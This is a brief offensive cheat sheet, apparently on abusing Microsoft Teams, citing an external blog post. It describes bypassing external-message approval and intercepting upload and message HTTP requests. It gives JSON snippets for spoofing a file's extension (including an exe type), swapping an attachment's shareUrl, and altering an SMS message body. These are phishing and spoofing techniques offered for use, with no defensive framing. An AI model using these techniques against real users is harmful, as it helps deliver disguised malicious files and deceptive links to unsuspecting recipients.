### Sending messages from an external organisation
```
Bypass request approval by sending message to 2 persons.
```

### Spoofing file extension
```
Upload file and intercept HTTP request.
Manipulate file extension:

[...]
"properies" : {
  "files" : [{\"@type\": ... \"type\":\"exe\",\"title\":\"file.extensionToManipulate\" ...
[...]
```

### Spoofing attachment link
```
Upload file and intercept HTTP request.
Manipulate the shareUrl value:

[...]
"properies" : {
  "files" :
  ... \"shareUrl\":\"https://urlToManipulate\"
[...]
```

### Manipulate sms messages
```
Type phone number into search bar, send a message and intercept HTTP request.
Manipulate message body value:

[...]
"message":{
  "body":"<p>Insert new message</p>"
[...]
```

### Ressource
https://mrd0x.com/microsoft-teams-abuse

